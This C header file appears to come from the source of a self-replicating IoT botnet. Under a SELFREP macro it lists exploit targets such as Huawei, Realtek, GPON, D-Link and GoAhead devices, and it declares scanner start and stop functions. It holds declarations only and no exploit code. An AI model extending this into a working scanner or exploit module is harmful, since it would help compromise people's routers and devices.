#ifdef SELFREP
#pragma "once"


struct exploit_kill {
  enum {
    KILL_HUAWEI,
    KILL_REALTEK,
    KILL_TELNET,
    KILL_GPON1,
    KILL_GPON2,
    KILL_DLINK,
    KILL_HNAP,
    KILL_GOAHEAD,
    KILL_netgear_r7064
  }state;
};
void start_scanner(void);
void stop_scanner(void);

#endif




